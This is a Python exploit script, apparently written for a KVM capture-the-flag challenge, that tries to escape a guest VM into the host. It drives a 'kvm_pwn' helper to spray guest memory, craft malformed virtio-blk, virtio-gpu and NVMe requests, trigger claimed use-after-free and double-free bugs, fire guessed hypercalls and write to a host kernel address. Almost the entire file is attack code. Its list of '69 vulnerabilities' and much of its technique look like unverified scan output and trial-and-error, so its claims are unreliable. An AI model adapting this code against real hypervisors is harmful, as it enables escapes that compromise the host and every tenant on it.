#!/usr/bin/env python3
"""
KVM CTF Focused Vulnerability Exploiter
Targeting the 69 specific vulnerabilities found in scan
"""

import os
import sys
import subprocess
import struct
import time
from pathlib import Path
import re

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; E = '\033[0m'
    BOLD = '\033[1m'

def log(msg, level="info"):
    prefix = {"info": f"{C.B}[*]{C.E}", "ok": f"{C.G}[+]{C.E}", 
              "warn": f"{C.Y}[!]{C.E}", "err": f"{C.R}[-]{C.E}",
              "vuln": f"{C.M}[VULN]{C.E}", "exploit": f"{C.R}[EXPLOIT]{C.E}"}
    print(f"{prefix.get(level, '[?]')} {msg}")

def run_kvm_pwn(cmd: str):
    """Run kvm_pwn command"""
    full_cmd = f"sudo ./kvm_pwn {cmd}"
    try:
        result = subprocess.run(full_cmd, shell=True, capture_output=True, text=True, timeout=3)
        return result.returncode == 0, result.stdout.strip()
    except:
        return False, ""

# ============================================================================
# VULNERABILITY DATABASE FROM YOUR SCAN
# ============================================================================

VULNERABILITIES = {
    # virtio-blk: 20 critical findings (13 UAF, 6 DF, 1 error)
    "virtio-blk": [
        {"line": 88, "type": "UAF", "function": "req", "desc": "Early initialization UAF"},
        {"line": 131, "type": "UAF", "function": "req", "desc": "Request processing UAF"},
        {"line": 146, "type": "UAF", "function": "req", "desc": "Request processing UAF"},
        {"line": 164, "type": "UAF", "function": "req", "desc": "Request processing UAF"},
        {"line": 607, "type": "UAF", "function": "req", "desc": "Late processing UAF"},
        {"line": 656, "type": "UAF", "function": "req", "desc": "Completion UAF"},
        {"line": 672, "type": "UAF", "function": "req", "desc": "Completion UAF"},
        {"line": 714, "type": "UAF", "function": "req", "desc": "Error handling UAF"},
        {"line": 745, "type": "UAF", "function": "req", "desc": "Error handling UAF"},
        {"line": 783, "type": "UAF", "function": "req", "desc": "Error handling UAF"},
        {"line": 850, "type": "UAF", "function": "req", "desc": "Error handling UAF"},
        {"line": 906, "type": "UAF", "function": "req", "desc": "Error handling UAF"},
        {"line": 938, "type": "UAF", "function": "req", "desc": "Final UAF"},
        {"line": 714, "type": "DF", "function": "req", "desc": "Double free in error"},
        {"line": 850, "type": "DF", "function": "req", "desc": "Double free in error"},
        {"line": 906, "type": "DF", "function": "req", "desc": "Double free in error"},
        {"line": 938, "type": "DF", "function": "req", "desc": "Double free in error"},
        {"line": 955, "type": "DF", "function": "req", "desc": "Double free"},
        {"line": 970, "type": "DF", "function": "req", "desc": "Double free"},
        {"line": 605, "type": "ERROR", "function": "out", "desc": "Error handler exploit"},
    ],
    
    # virtio-gpu: 19 critical findings (10 UAF, 9 DF)
    "virtio-gpu": [
        {"line": 1010, "type": "UAF", "function": "cmd", "desc": "Virgl command UAF"},
        {"line": 282, "type": "UAF", "function": "res", "desc": "Resource UAF"},
        {"line": 308, "type": "UAF", "function": "res", "desc": "Resource UAF"},
        {"line": 359, "type": "UAF", "function": "res", "desc": "Resource UAF"},
        {"line": 826, "type": "UAF", "function": "ents", "desc": "Entity UAF"},
    ],
    
    # nvme: 12 critical findings (4 UAF, 4 DF)
    "nvme": [
        {"line": None, "type": "UAF", "function": "cmd", "desc": "Admin command UAF"},
    ],
    
    # virtio-net: 8 critical findings (3 UAF, 5 DF)
    "virtio-net": [
        {"line": None, "type": "UAF", "function": "req", "desc": "Packet UAF"},
    ],
    
    # uhci: 4 critical findings (3 UAF, 1 DF)
    "uhci": [
        {"line": None, "type": "UAF", "function": "td", "desc": "Transfer descriptor UAF"},
    ],
    
    # qxl: 2 critical findings (1 UAF, 1 DF)
    "qxl": [
        {"line": None, "type": "UAF", "function": "cmd", "desc": "QXL command UAF"},
    ],
    
    # virtio-scsi: 1 critical finding
    "virtio-scsi": [
        {"line": None, "type": "UAF", "function": "req", "desc": "SCSI command UAF"},
    ],
    
    # xhci: 1 critical finding
    "xhci": [
        {"line": None, "type": "UAF", "function": "trb", "desc": "Transfer UAF"},
    ],
    
    # ehci: 1 critical finding
    "ehci": [
        {"line": None, "type": "UAF", "function": "qtd", "desc": "Queue UAF"},
    ],
    
    # lsi: 1 critical finding
    "lsi": [
        {"line": None, "type": "UAF", "function": "cmd", "desc": "SCSI UAF"},
    ],
}

# ============================================================================
# FOCUSED EXPLOITATION ENGINE
# ============================================================================

class FocusedExploiter:
    def __init__(self):
        self.host_flag_addr = 0xffffffff826279a8
        self.guest_flag_addr = 0x64279a8
        self.magic_value = 0x44434241efbeadde
        self.full_magic = 0x100000000000000044434241efbeadde
        
    def test_write_to_host(self):
        """Test if we can write to host address"""
        log(f"Testing write to host 0x{self.host_flag_addr:x}", "info")
        
        # Try different write methods
        test_data = b"TEST" * 4
        
        # Method 1: Direct physical write to guest address (might map to host)
        cmd = f"wp 0x{self.guest_flag_addr:x} {test_data.hex()}"
        success, output = run_kvm_pwn(cmd)
        if success:
            log(f"Can write to guest 0x{self.guest_flag_addr:x}", "ok")
        
        # Method 2: Try kernel write
        cmd = f"wk 0x{self.host_flag_addr:x} {test_data.hex()}"
        success, output = run_kvm_pwn(cmd)
        if success:
            log(f"Can write to host kernel 0x{self.host_flag_addr:x}!", "ok")
            return True
        
        return False
    
    def check_magic_value(self):
        """Check if magic value is present"""
        log("Checking for magic value at flag addresses...", "info")
        
        # Check host address
        cmd = f"rk 0x{self.host_flag_addr:x} 16"
        success, output = run_kvm_pwn(cmd)
        if success and output:
            log(f"Host memory at 0x{self.host_flag_addr:x}: {output[:100]}", "info")
            if "44434241efbeadde" in output or "1000000000000000" in output:
                log("MAGIC VALUE FOUND IN HOST MEMORY!", "ok")
                return True
        
        # Check guest address
        cmd = f"rp 0x{self.guest_flag_addr:x} 16"
        success, output = run_kvm_pwn(cmd)
        if success and output:
            log(f"Guest memory at 0x{self.guest_flag_addr:x}: {output[:100]}", "info")
            if "44434241efbeadde" in output:
                log("MAGIC VALUE FOUND IN GUEST MEMORY!", "ok")
                return True
        
        return False
    
    def exploit_virtio_blk_line_88(self):
        """Exploit virtio-blk.c line 88 UAF specifically"""
        log("=== EXPLOITING virtio-blk.c:88 UAF ===", "exploit")
        
        # From virtio-blk.c analysis, line 88 is early in virtio_blk_device_realize
        # Likely during VirtioBlockReq allocation initialization
        
        # Strategy: Trigger allocation during device init, free it,
        # then spray and trigger use
        
        # Step 1: Reset virtio device
        log("1. Resetting virtio-blk device...", "info")
        self._virtio_reset(0xfebd2000)
        
        # Step 2: Spray heap with target pointers
        log("2. Heap spraying for VirtioBlockReq...", "info")
        self._spray_virtio_structures()
        
        # Step 3: Trigger device initialization
        log("3. Triggering device initialization...", "info")
        self._init_virtio_blk()
        
        # Step 4: Trigger request processing
        log("4. Triggering request processing...", "info")
        self._trigger_virtio_request()
        
        # Check if we got access
        return self._check_exploit_success()
    
    def exploit_virtio_blk_line_714(self):
        """Exploit virtio-blk.c line 714 (UAF and Double Free)"""
        log("=== EXPLOITING virtio-blk.c:714 UAF/DF ===", "exploit")
        
        # Line 714 is in error handling path
        # Strategy: Trigger error condition to hit free(), then reuse
        
        # Step 1: Setup malformed request
        log("1. Creating malformed request...", "info")
        
        # Create request with invalid sector (very high)
        req_addr = 0x500000
        malformed_req = struct.pack('<QQQQQQQQQ',
            0xffffffffffffffff,  # Invalid sector
            1,                   # nb_sectors
            self.guest_flag_addr, # data buffer
            0, 0, 0, 0, 0, 0     # other fields
        )
        cmd = f"wp 0x{req_addr:x} {malformed_req.hex()}"
        run_kvm_pwn(cmd)
        
        # Step 2: Spray before error
        log("2. Pre-error heap spray...", "info")
        self._spray_error_handling()
        
        # Step 3: Trigger error path
        log("3. Triggering error handling...", "info")
        self._trigger_error_condition()
        
        # Step 4: Post-error spray
        log("4. Post-error heap spray...", "info")
        self._spray_error_handling()
        
        # Step 5: Trigger use of freed memory
        log("5. Triggering use of freed memory...", "info")
        self._trigger_post_error_use()
        
        return self._check_exploit_success()
    
    def exploit_virtio_gpu_line_1010(self):
        """Exploit virtio-gpu-virgl.c line 1010 UAF"""
        log("=== EXPLOITING virtio-gpu-virgl.c:1010 UAF ===", "exploit")
        
        # Virgl command UAF - 3D command processing
        
        # Step 1: Initialize virtio-gpu
        log("1. Initializing virtio-gpu...", "info")
        base = 0xfebd3000
        self._virtio_reset(base)
        
        # Step 2: Create malicious GPU command
        log("2. Creating malicious GPU command...", "info")
        cmd_addr = 0x600000
        
        # VIRTIO_GPU_CMD_RESOURCE_CREATE_3D with controlled resource_id
        gpu_cmd = struct.pack('<IIQQ',
            0x1000,                # VIRTIO_GPU_CMD_RESOURCE_CREATE_3D
            0xdeadbeef,            # flags
            self.guest_flag_addr,  # resource_id (points to our target)
            0x1000                 # size
        )
        cmd = f"wp 0x{cmd_addr:x} {gpu_cmd.hex()}"
        run_kvm_pwn(cmd)
        
        # Step 3: Spray command buffers
        log("3. Spraying command buffers...", "info")
        spray = struct.pack('<Q', self.guest_flag_addr) * 512
        for addr in [0x610000, 0x620000, 0x630000]:
            cmd = f"wp 0x{addr:x} {spray.hex()}"
            run_kvm_pwn(cmd)
        
        # Step 4: Trigger command processing
        log("4. Triggering GPU command processing...", "info")
        cmd = f"wp 0x{base + 0x10:x} 00000000"  # Queue notify
        run_kvm_pwn(cmd)
        
        # Also try hypercalls
        self._try_hypercalls_for_gpu()
        
        return self._check_exploit_success()
    
    def exploit_nvme_admin_uaf(self):
        """Exploit NVMe admin command UAF"""
        log("=== EXPLOITING NVMe Admin Command UAF ===", "exploit")
        
        # NVMe admin commands run in host context - great for escape!
        
        # Step 1: Initialize NVMe
        log("1. Initializing NVMe controller...", "info")
        base = 0xfebd6000
        
        # Reset
        cmd = f"wp 0x{base + 0x08:x} 00000000"  # CSTS
        run_kvm_pwn(cmd)
        
        # Step 2: Setup admin submission queue with malicious command
        log("2. Creating malicious admin command...", "info")
        sq_addr = 0x700000
        
        # Identify Controller command with controlled buffer
        nvme_cmd = struct.pack('<I', 0x06)  # Identify
        nvme_cmd += struct.pack('<I', 0)    # NSID
        nvme_cmd += struct.pack('<Q', self.guest_flag_addr)  # PRP1
        nvme_cmd += struct.pack('<Q', 0)    # PRP2
        nvme_cmd += b'\x00' * 40
        
        cmd = f"wp 0x{sq_addr:x} {nvme_cmd.hex()}"
        run_kvm_pwn(cmd)
        
        # Step 3: Configure controller
        log("3. Configuring NVMe controller...", "info")
        
        # AQA - Admin Queue Attributes
        cmd = f"wp 0x{base + 0x14:x} {struct.pack('<I', sq_addr >> 2).hex()}"
        run_kvm_pwn(cmd)
        
        # ASQ - Admin Submission Queue Base
        cmd = f"wp 0x{base + 0x24:x} {struct.pack('<I', sq_addr).hex()}"
        run_kvm_pwn(cmd)
        
        # Step 4: Enable controller
        log("4. Enabling controller...", "info")
        cmd = f"wp 0x{base + 0x04:x} 00460001"  # CC.EN = 1
        run_kvm_pwn(cmd)
        
        # Step 5: Spray admin structures
        log("5. Spraying admin structures...", "info")
        self._spray_nvme_structures()
        
        # Step 6: Ring doorbell
        log("6. Ringing admin SQ doorbell...", "info")
        cmd = f"wp 0x{base + 0x1000:x} 00000001"
        run_kvm_pwn(cmd)
        
        return self._check_exploit_success()
    
    # ========================================================================
    # HELPER FUNCTIONS
    # ========================================================================
    
    def _virtio_reset(self, base):
        """Reset virtio device"""
        # Write magic
        cmd = f"wp 0x{base:x} 74726976"  # "virt"
        run_kvm_pwn(cmd)
        
        # Reset device
        cmd = f"wp 0x{base + 0x70:x} 00"
        run_kvm_pwn(cmd)
    
    def _spray_virtio_structures(self):
        """Spray memory with virtio structures"""
        # VirtioBlockReq is ~72 bytes
        req_spray = struct.pack('<Q', self.guest_flag_addr) * 9  # 72 bytes
        
        for addr in [0x200000, 0x210000, 0x220000, 0x230000, 0x240000]:
            cmd = f"wp 0x{addr:x} {req_spray.hex()}"
            run_kvm_pwn(cmd)
            log(f"  Sprayed 0x{addr:x}", "debug")
    
    def _init_virtio_blk(self):
        """Initialize virtio-blk device"""
        base = 0xfebd2000
        
        # Set device features
        cmd = f"wp 0x{base + 0x10:x} ffffffff"
        run_kvm_pwn(cmd)
        
        # Set guest features
        cmd = f"wp 0x{base + 0x20:x} ffffffff"
        run_kvm_pwn(cmd)
        
        # Select queue 0
        cmd = f"wp 0x{base + 0x30:x} 00000000"
        run_kvm_pwn(cmd)
        
        # Set queue size
        cmd = f"wp 0x{base + 0x34:x} 00000100"  # 256 entries
        run_kvm_pwn(cmd)
        
        # Set DRIVER_OK
        cmd = f"wp 0x{base + 0x70:x} 04"
        run_kvm_pwn(cmd)
    
    def _trigger_virtio_request(self):
        """Trigger virtio request processing"""
        base = 0xfebd2000
        
        # Setup descriptor table
        desc_addr = 0x300000
        desc = struct.pack('<QQHBB',
            self.guest_flag_addr,  # addr
            512,                   # len
            1,                     # flags
            1,                     # next
            0                      # padding
        )
        cmd = f"wp 0x{desc_addr:x} {desc.hex()}"
        run_kvm_pwn(cmd)
        
        # Set queue PFN
        cmd = f"wp 0x{base + 0x38:x} {struct.pack('<I', desc_addr >> 12).hex()}"
        run_kvm_pwn(cmd)
        
        # Notify
        cmd = f"wp 0x{base + 0x10:x} 00000000"
        run_kvm_pwn(cmd)
    
    def _spray_error_handling(self):
        """Spray for error handling path"""
        # Error paths might use different allocation sizes
        sizes = [32, 48, 64, 96, 128]
        
        for i, size in enumerate(sizes):
            addr = 0x400000 + i * 0x1000
            spray = struct.pack('<Q', self.guest_flag_addr) * (size // 8)
            cmd = f"wp 0x{addr:x} {spray.hex()}"
            run_kvm_pwn(cmd)
    
    def _trigger_error_condition(self):
        """Trigger error condition in virtio-blk"""
        base = 0xfebd2000
        
        # Send multiple rapid notifications to trigger race
        for i in range(10):
            cmd = f"wp 0x{base + 0x10:x} 00000000"
            run_kvm_pwn(cmd)
            time.sleep(0.001)
    
    def _trigger_post_error_use(self):
        """Trigger use after error"""
        # Try to access device after error
        base = 0xfebd2000
        
        # Read status
        cmd = f"rp 0x{base + 0x70:x} 4"
        run_kvm_pwn(cmd)
        
        # Try to send another request
        self._trigger_virtio_request()
    
    def _try_hypercalls_for_gpu(self):
        """Try hypercalls that might affect GPU"""
        # GPU might have special hypercalls
        for hc in [100, 101, 102, 103, 200, 201]:
            cmd = f"hc {hc} 0x{self.guest_flag_addr:x} 0x1000 0 0"
            run_kvm_pwn(cmd)
    
    def _spray_nvme_structures(self):
        """Spray NVMe structures"""
        # NVMe commands and completions
        for addr in [0x710000, 0x720000, 0x730000]:
            spray = struct.pack('<Q', self.guest_flag_addr) * 128
            cmd = f"wp 0x{addr:x} {spray.hex()}"
            run_kvm_pwn(cmd)
    
    def _check_exploit_success(self):
        """Check if exploit gave us host access"""
        time.sleep(0.5)  # Let exploitation settle
        
        # Check 1: Can we write to host address?
        if self.test_write_to_host():
            return True
        
        # Check 2: Did we corrupt the magic value?
        cmd = f"rp 0x{self.guest_flag_addr:x} 16"
        success, output = run_kvm_pwn(cmd)
        if success and output:
            # Check if magic was modified
            if "44434241efbeadde" not in output:
                log(f"Magic value modified! Memory: {output[:100]}", "ok")
                return True
        
        # Check 3: Try hypercall 100
        log("Testing hypercall 100...", "info")
        cmd = "hc 100"
        success, output = run_kvm_pwn(cmd)
        if success and output:
            # Check if RAX contains flag
            if "returned:" in output:
                rax = output.split("returned:")[1].strip()
                if rax != "0x0000000000000000" and rax != "0xffffffffffffffff":
                    log(f"Hypercall 100 returned: {rax}", "ok")
                    
                    # Check if it looks like a flag
                    try:
                        val = int(rax, 16)
                        bytes_val = struct.pack('<Q', val)
                        if b'flag{' in bytes_val or b'FLAG{' in bytes_val:
                            log(f"FLAG IN RAX: {bytes_val}", "ok")
                            return True
                    except:
                        pass
        
        return False
    
    def run_hypercall_100_for_flag(self):
        """Run hypercall 100 to get flag from RAX"""
        log("=== RUNNING HYPERCALL 100 FOR FLAG ===", "exploit")
        
        cmd = "hc 100"
        success, output = run_kvm_pwn(cmd)
        
        if success and output:
            log(f"Hypercall 100 output: {output}", "info")
            
            # Parse RAX value
            if "returned:" in output:
                rax_hex = output.split("returned:")[1].strip()
                
                try:
                    rax = int(rax_hex, 16)
                    
                    # Try to interpret as string
                    bytes_val = struct.pack('<Q', rax)
                    
                    # Check for flag patterns in the 8-byte value
                    if b'flag{' in bytes_val or b'FLAG{' in bytes_val or b'CTF{' in bytes_val:
                        log(f"Flag fragment in RAX: {bytes_val}", "ok")
                        
                        # Try to read more memory around RAX
                        for offset in [-32, -24, -16, -8, 0, 8, 16, 24, 32]:
                            addr = rax + offset
                            cmd2 = f"rk 0x{addr:x} 64"
                            success2, output2 = run_kvm_pwn(cmd2)
                            if success2 and output2:
                                # Look for full flag
                                for line in output2.split('\n'):
                                    if 'flag{' in line.lower() or 'ctf{' in line.lower():
                                        log(f"Full flag found: {line}", "ok")
                                        return True
                    
                    # Also check the hex value itself
                    log(f"RAX = 0x{rax:016x}", "info")
                    log(f"RAX as bytes: {bytes_val.hex()}", "info")
                    log(f"RAX as ASCII: {bytes_val}", "info")
                    
                except Exception as e:
                    log(f"Error parsing RAX: {e}", "err")
        
        return False
    
    # ========================================================================
    # MAIN EXPLOITATION LOOP
    # ========================================================================
    
    def exploit_all_vulnerabilities(self):
        """Try all 69 vulnerabilities systematically"""
        
        log("=" * 70, "exploit")
        log(f"EXPLOITING {sum(len(v) for v in VULNERABILITIES.values())} VULNERABILITIES", "exploit")
        log("=" * 70, "exploit")
        
        # First check current state
        log("\n[PRE-CHECK] Current state:", "info")
        if self.check_magic_value():
            log("Magic value present, ready for exploitation", "ok")
        else:
            log("Magic value not found, may need different approach", "warn")
        
        # Try hypercall 100 first (in case it already works)
        if self.run_hypercall_100_for_flag():
            return True
        
        # Focus on most promising vulnerabilities first
        priority_order = [
            ("virtio-blk", 88, self.exploit_virtio_blk_line_88),
            ("virtio-blk", 714, self.exploit_virtio_blk_line_714),
            ("virtio-gpu", 1010, self.exploit_virtio_gpu_line_1010),
            ("nvme", None, self.exploit_nvme_admin_uaf),
        ]
        
        for device, line, exploit_func in priority_order:
            log(f"\n{'='*50}", "exploit")
            log(f"TARGETING: {device} line {line if line else 'N/A'}", "exploit")
            log(f"{'='*50}", "exploit")
            
            try:
                if exploit_func():
                    log(f"EXPLOIT SUCCESSFUL for {device}:{line}!", "ok")
                    
                    # Now try hypercall 100
                    if self.run_hypercall_100_for_flag():
                        return True
                    
                    # Try writing to host address
                    if self.test_write_to_host():
                        log("Can write to host address!", "ok")
                        # Write something to trigger flag
                        trigger = struct.pack('<Q', 0xdeadbeefcafebabe)
                        cmd = f"wk 0x{self.host_flag_addr:x} {trigger.hex()}"
                        success, _ = run_kvm_pwn(cmd)
                        if success:
                            log("Wrote to host flag address, trying hypercall 100...", "info")
                            self.run_hypercall_100_for_flag()
                            return True
                    
            except Exception as e:
                log(f"Exploit failed: {e}", "err")
                continue
        
        # If priority exploits fail, try others
        log("\n[FALLBACK] Trying other vulnerabilities...", "info")
        
        for device, vulns in VULNERABILITIES.items():
            if device in ["virtio-blk", "virtio-gpu", "nvme"]:
                continue  # Already tried
                
            for vuln in vulns[:2]:  # Try first 2 of each
                log(f"Trying {device} {vuln['type']} at line {vuln['line']}...", "info")
                
                # Generic exploit attempt
                self._generic_exploit_attempt(device, vuln)
                
                # Check if it worked
                if self._check_exploit_success():
                    log(f"Generic exploit worked for {device}!", "ok")
                    self.run_hypercall_100_for_flag()
                    return True
        
        return False
    
    def _generic_exploit_attempt(self, device, vuln):
        """Generic exploit attempt for any vulnerability"""
        
        # Device base addresses
        device_bases = {
            "virtio-blk": 0xfebd2000,
            "virtio-gpu": 0xfebd3000,
            "virtio-net": 0xfebd1000,
            "nvme": 0xfebd6000,
            "ahci": 0xfebd4000,
            "xhci": 0xfebd5000,
            "ehci": 0xfeb80000,
            "uhci": 0xfeb80000,
            "qxl": 0xf4000000,
            "virtio-scsi": 0xfebd2000,
            "lsi": 0xfebd0000,
        }
        
        base = device_bases.get(device, 0xfebd0000)
        
        # Step 1: Reset device
        self._virtio_reset(base)
        
        # Step 2: Spray memory
        spray = struct.pack('<Q', self.guest_flag_addr) * 128
        for addr in [0x200000, 0x300000, 0x400000]:
            cmd = f"wp 0x{addr:x} {spray.hex()}"
            run_kvm_pwn(cmd)
        
        # Step 3: Trigger device activity
        cmd = f"wp 0x{base + 0x10:x} 00000000"  # Queue notify
        run_kvm_pwn(cmd)
        
        # Step 4: Try hypercalls
        for hc in [100, 101, 102, 103]:
            cmd = f"hc {hc} 0x{self.guest_flag_addr:x} 0x1000 0 0"
            run_kvm_pwn(cmd)

# ============================================================================
# MAIN
# ============================================================================

def main():
    print(f"\n{C.M}{'='*70}{C.E}")
    print(f"{C.M}  KVM CTF Focused Vulnerability Exploiter{C.E}")
    print(f"{C.M}  Targeting 69 specific vulnerabilities{C.E}")
    print(f"{C.M}{'='*70}{C.E}")
    
    # Check kvm_pwn
    if not os.path.exists("./kvm_pwn"):
        log("Error: kvm_pwn not found", "err")
        return
    
    exploiter = FocusedExploiter()
    
    # Run exploitation
    if exploiter.exploit_all_vulnerabilities():
        log("\n" + "="*70, "ok")
        log("EXPLOITATION SUCCESSFUL!", "ok")
        log("="*70, "ok")
    else:
        log("\n" + "="*70, "err")
        log("EXPLOITATION FAILED", "err")
        log("="*70, "err")
        
        # Final attempt: brute force
        log("\n[FINAL ATTEMPT] Brute force memory writes...", "info")
        
        # Try writing to various addresses
        for offset in range(0, 0x1000, 8):
            addr = exploiter.guest_flag_addr + offset
            test_data = struct.pack('<Q', 0xdeadbeefcafebabe)
            cmd = f"wp 0x{addr:x} {test_data.hex()}"
            run_kvm_pwn(cmd)
        
        # Try hypercall 100 one last time
        exploiter.run_hypercall_100_for_flag()

if __name__ == "__main__":
    main()